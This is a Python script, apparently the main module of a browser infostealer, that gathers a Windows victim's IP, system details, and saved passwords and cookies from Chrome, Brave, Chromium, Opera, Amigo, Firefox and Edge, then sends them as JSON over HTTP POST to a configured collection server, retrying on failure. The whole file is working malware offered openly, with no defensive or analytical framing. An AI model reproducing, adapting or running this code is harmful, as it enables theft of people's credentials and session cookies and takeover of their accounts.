import json
from http import client
from time import sleep


from stealer import info
from stealer import chromium
from stealer import firefox


from stealer import config


def send(data):
    try:
        connection = client.HTTPConnection(f'{config.server_host}:{config.server_port}')
        connection.request("POST", "/", data)
    finally:
        connection.close()


def send_data(data):
    data = json.dumps(data)
    try:
        send(data)
    except KeyboardInterrupt:
        print('Exiting ..')
    except:
        print('error')
        sleep(60)
        send(data)


if __name__ == '__main__' and config.os == 'windows':
    data = dict()
    data['name'] = info.get_ip()
    data['info'] = info.get_all()

    if (chromium.chrome_cookies != 'not found') or (chromium.chrome_pass != 'not found'):
        data['chrome'] = chromium.chrome_pass + chromium.chrome_cookies + '\n'
    else:
        data['chrome'] = 'Not Found'

    if (chromium.brave_cookies != 'not found') or (chromium.brave_pass != 'not found'):
       data['brave'] = chromium.brave_pass + chromium.brave_cookies + '\n'
    else:
        data['brave'] = 'Not Found'
    
    if (chromium.chromium_cookies != 'not found') or (chromium.chromium_pass != 'not found'):
        data['chromium'] = chromium.chromium_pass + chromium.chromium_cookies + '\n'
    else:
        data['chromium'] = 'Not Found'

    if (chromium.opera_cookies != 'not found') or (chromium.opera_pass != 'not found'):
        data['opera'] = chromium.opera_pass + chromium.opera_cookies + '\n'
    else:
        data['opera'] = 'Not Found'

    if (chromium.amigo_cookies != 'not found') or (chromium.amigo_pass != 'not found'):
        data['amigo'] = chromium.amigo_pass + chromium.amigo_cookies + '\n'
    else:
        data['amigo'] = 'Not Found'

    if (firefox.firefox_pass != 'not found') or (firefox.firefox_cookies != 'not found'):
        data['firefox'] = str(firefox.firefox_pass) + str(firefox.firefox_cookies) + '\n'
    else:
        data['firefox'] = 'Not Found'

    if (chromium.edge_pass != 'not found') or (chromium.edge_cookies != 'not found'):
        data['edge'] = chromium.edge_pass + chromium.edge_cookies + '\n'
    else:
        data['edge'] = 'Not Found'

    send_data(data)
